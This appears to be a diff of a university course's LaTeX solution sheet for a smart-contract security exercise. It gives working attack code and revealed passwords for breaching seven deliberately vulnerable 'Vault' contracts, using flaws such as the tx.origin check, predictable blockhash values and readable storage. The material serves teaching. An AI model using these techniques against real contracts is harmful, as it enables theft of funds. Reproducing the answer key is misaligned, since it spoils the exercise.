@@ -4,7 +4,7 @@
 \usepackage{listings}
 \usepackage{xcolor}
 \usepackage{geometry}
-
+\usepackage{listings-solidity}  % Include Solidity highlighting
 \usepackage{minted} % For advanced code listings
 
 % Define a custom minted style (optional)
@@ -79,72 +79,182 @@
 \begin{document}
 
 \maketitle
-The example implementation of the CTU Token contract can be found in this \href{https://gitlab.fel.cvut.cz/radovluk/smart-contracts-exercises/-/tree/main/03-ERC20-CTUToken/solution/solution-code}{GitLab repository}. The required implementation is in the file \texttt{contracts/CTUToken.sol}. Even this implementation cannot prevent a frontrunning attack using only the \texttt{approve()} function. One possible solution is to use the \texttt{increaseAllowance()} and \texttt{decreaseAllowance()} functions instead of the \texttt{approve()} function.
 
-\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{solidity}
-function increaseAllowance(
-   address spender,
-   uint256 addedValue
-) public returns (bool success) {
-   // Check if the spender is not the zero address
-   require(spender != address(0), "Increase allowance for zero address");
-   // Increase the allowance
-   allowances[msg.sender][spender] += addedValue;
-   // Emit Approval event
-   emit Approval(msg.sender, spender, allowances[msg.sender][spender]);
-   // Return true if the operation is successful
-   return true;
-}
+\noindent
+The solved exercise 4 can be found in this \href{https://gitlab.fel.cvut.cz/radovluk/smart-contracts-exercises/-/tree/main/04-Unbreakable-Vault/solution/solution-code?ref_type=heads}{GitLab repository}.
+
+\subsection*{Vault01: A Password Password}
+
+To breach \texttt{Vault01}, you need to call the \texttt{breachVault} function in \texttt{test/Vault01.js} with the correct password. The password is the \texttt{keccak256} hash of the string \texttt{"password"}. Use \texttt{ethers.id("password")} to compute the hash and pass it to the function to successfully breach the vault. See \href{https://docs.ethers.org/v6/api/hashing/\#id}{id docs} for more.
+
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
+// Hash the "password" string using Keccak256
+const hash = ethers.id("password");
+
+// Breach the vault
+await vault.connect(player).breachVault(hash);
 \end{minted}
 
-\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{solidity}
-function decreaseAllowance(
-   address spender,
-   uint256 subtractedValue
-) public returns (bool success) {
-   // Check if the spender is not the zero address
-   require(spender != address(0), "Decrease allowance for zero address");
-   // Check if the current allowance is sufficient
-   require(
-       allowances[msg.sender][spender] >= subtractedValue,
-       "Decreased allowance below zero"
-   );
-   // Decrease the allowance
-   allowances[msg.sender][spender] -= subtractedValue;
-   // Emit Approval event
-   emit Approval(msg.sender, spender, allowances[msg.sender][spender]);
-   // Return true if the operation is successful
-   return true;
-}
+\subsection*{Vault02: Packet Sender}
+
+To breach \texttt{Vault02}, you need to call the \texttt{breachVault} function with the correct password. The password is the \texttt{keccak256} hash of the \texttt{msg.sender} address. Use \texttt{ethers.solidityPacked} to mimic \texttt{abi.encodePacked(msg.sender)}, first encode the player's address. See \href{https://docs.ethers.org/v6/api/hashing/\#solidityPacked}{solidityPacked docs} for more.
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
+// Using ethers.solidityPacked to mimic abi.encodePacked(msg.sender)
+const encodedAddress = ethers.solidityPacked(["address"], [player.address]);
+
+// Hash the encoded address using keccak256
+const hash = ethers.keccak256(encodedAddress);
+
+// Call breachVault with the derived value
+await vault.connect(player).breachVault(hash);
 \end{minted}
 
-The recommended approach is to use the following ERC20 token implementation from OpenZeppelin. You can find it in the file \texttt{contracts/CTUTokenOpenZeppelin.sol}.
-Go through \href{https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol}{OpenZeppelin GitHub repository} and understand it.
+\subsection*{Vault03: Origins}
 
-\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{solidity}
+To breach \texttt{Vault03}, you need to bypass the requirement that \texttt{msg.sender} must not be equal to \texttt{tx.origin}. This means the function must be called from a smart contract rather than directly from an externally owned account (EOA). 
+
+Deploy the \texttt{Vault03Attack} contract, passing the vault's address as a parameter. Then, call the \texttt{attack} function from the attack contract, which in turn calls \texttt{breachVault()}. Since the attack contract acts as an intermediary, \texttt{msg.sender} will be the attack contract, while \texttt{tx.origin} remains the player's address, satisfying the vault's condition. 
+
+\begin{lstlisting}[language=Solidity]
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.28;
 
-// Import OpenZeppelin's ERC20 implementation
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+interface IVault03 {
+    function breachVault() external returns (bool);
+}
 
-/**
- * @title CTUToken
- * @dev A custom implementation of an ERC-20 Token using OpenZeppelin's library.
- */
-contract CTUToken is ERC20 {
-    // Define the initial supply: 1,000,000 tokens with 18 decimal places
-    uint256 private constant INITIAL_SUPPLY = 1_000_000 * 10 ** 18;
+contract Vault03Attack {
+    IVault03 public vault;
 
-    /**
-     * @dev Constructor that initializes the ERC-20 token with a name and symbol,
-     * and mints the total supply to the deployer's address.
-     */
-    constructor() ERC20("CTU Token", "CTU") {
-        // Mint the initial supply to the deployer of the contract
-        _mint(msg.sender, INITIAL_SUPPLY);
+    constructor(address _vaultAddress) {
+        vault = IVault03(_vaultAddress);
+    }
+
+    function attack() external returns (bool) {
+        return vault.breachVault(); // msg.sender != tx.origin
     }
 }
+\end{lstlisting}
+
+\noindent
+This successfully updates \texttt{lastSolver} to the player's address, completing the challenge.
+
+\subsection*{Vault04: On the Same Block}
+
+To breach \texttt{Vault04}, you need to provide a correct password computed using \texttt{blockhash(block.number - 1)} and \texttt{block.timestamp}. Since both values are accessible during the same transaction, you can compute the correct password on-chain and submit it immediately. Deploy the \texttt{Vault04Attack} contract, passing the vault's address as a parameter. Then, call the \texttt{attack} function from the attack contract, which computes the password and calls \texttt{breachVault()} with the correct value.
+
+\begin{lstlisting}[language=Solidity]
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+interface IVault04 {
+    function breachVault(bytes32 _password) external returns (bool);
+}
+
+contract Vault04Attack {
+    IVault04 public vault;
+
+    constructor(address _vaultAddress) {
+        vault = IVault04(_vaultAddress);
+    }
+
+    function attack() external returns (bool) {
+        // Compute the password using on-chain values in the same transaction
+        bytes32 password = keccak256(
+            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+        );
+
+        // Call the breachVault function with the computed password
+        return vault.breachVault(password);
+    }
+}
+\end{lstlisting}
+
+\noindent
+Since the password is derived from predictable on-chain data and is used within the same transaction, the attack works by ensuring the \texttt{blockhash} and \texttt{timestamp} remain valid when the vault processes the request.
+
+\subsection*{Vault05: Fortune Teller}
+
+To breach \texttt{Vault05}, you need to use the \texttt{blockhash} of the block when the password was locked in, but only after the next block has been mined. First, you lock the password using \texttt{lockInPassword}. Then, you must wait for the next block and calculate the password using \texttt{blockhash(lockInBlockNumber)}. The issue is that at the moment of locking in the password, we do not know the blockhash yet. We can only access the blockhash of the previous blocks. However, since the \texttt{blockhash} function only returns the blockhash for the last 256 blocks, otherwise it returns zero (see \href{https://docs.soliditylang.org/en/latest/units-and-global-variables.html}{Solidity documentation}). Therefore, we simply lock in a zero hash and mine 256 blocks before calling \texttt{breachVault}  function.
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
+// Lock the zero hash
+await vault.connect(player).lockInPassword(ethers.ZeroHash);
+
+// Mine 256 blocks
+for (let i = 0; i < 256; i++) {
+    await ethers.provider.send("evm_mine", []);
+}
+
+// Call breachVault()
+await vault.connect(player).breachVault();
+\end{minted}
+
+\subsection*{Vault06: Explorer}
+Since the contract is verified on Etherscan, you can view the constructor arguments on \href{https://sepolia.etherscan.io/address/0xA3a763bF62550511A0E485d6EB16c98937609A32\#code}{Sepolia Etherscan}.
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{bash}
+-----Decoded View---------------
+Arg [0] : _password (string): younailedit
+
+-----Encoded View---------------
+3 Constructor Arguments found :
+Arg [0] : 0000000000000000000000000000000000000000000000000000000000000020
+Arg [1] : 000000000000000000000000000000000000000000000000000000000000000b
+Arg [2] : 796f756e61696c65646974000000000000000000000000000000000000000000
+\end{minted}
+
+You can also find the password from a previous transactions that interacted with this contract. For example, see \href{https://sepolia.etherscan.io/inputdatadecoder?tx=0xc1f544372d0e732537a72f5e6fba05ad2ef2346695519416bedd8f37d2f17a57}{this transaction}. The password is "younailedit".
+
+\subsection*{Vault07: You Shall Not Pass!}
+
+To breach \texttt{Vault07}, you need to figure out the stored \texttt{password} string, which is located in the contract's storage. The storage layout of the contract reveals that the password is stored at slot 4.
+
+\begin{table}[h!]
+    \centering
+    \begin{tabular}{|l|l|c|c|c|}
+        \hline
+        \textbf{Name}      & \textbf{Type}    & \textbf{Slot} & \textbf{Offset} & \textbf{Bytes} \\ \hline
+        \texttt{lastSolver} & \texttt{address} & 0             & 0               & 20             \\ \hline
+        \texttt{small1}    & \texttt{uint8}   & 0             & 20              & 1              \\ \hline
+        \texttt{small2}    & \texttt{uint16}  & 0             & 21              & 2              \\ \hline
+        \texttt{isActive}  & \texttt{bool}    & 0             & 23              & 1              \\ \hline
+        \texttt{big1}      & \texttt{uint256} & 1             & 0               & 32             \\ \hline
+        \texttt{hashData}  & \texttt{bytes32} & 2             & 0               & 32             \\ \hline
+        \texttt{big2}      & \texttt{uint256} & 3             & 0               & 32             \\ \hline
+        \texttt{password}  & \texttt{string}  & 4             & 0               & 32             \\ \hline
+    \end{tabular}
+    \caption{Storage layout of the Vault07 contract}
+    \label{tab:vault07_storage}
+\end{table}
+
+
+First, retrieve the value stored in slot 4. The last byte of the stored value in this slot contains metadata, indicating the length of the password string. You can decode the password by using the first \texttt{length} bytes from the slot's value, where \texttt{length} is computed from the last byte metadata.
+
+After extracting the password string, you can compute the hash of the password using \texttt{keccak256(abi.encodePacked(password, playerAddress))}. Finally, pass the hashed password to the \texttt{breachVault} function to successfully breach the vault. The password is "youshallnotpassword".
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
+// Read the storage value at slot 4
+slotValue = await ethers.provider.getStorage(vaultAddress, 4);
+
+// Decode the password from the storage value
+const tagHex = slotValue.slice(-2);
+const tag = parseInt(tagHex, 16);
+const length = tag / 2;
+const actualDataHex = "0x" + slotValue.slice(2, 2 + length * 2);
+const actualPassword = ethers.toUtf8String(actualDataHex);
+
+// Hash the password and address
+const hashedPassword = ethers.solidityPackedKeccak256(
+    ["string", "address"], 
+    [actualPassword, playerAddress]
+);
+
+// Call breachVault with the derived hashed password
+const tx = await vault.breachVault(hashedPassword);
+await tx.wait();
 \end{minted}
 
 \end{document}
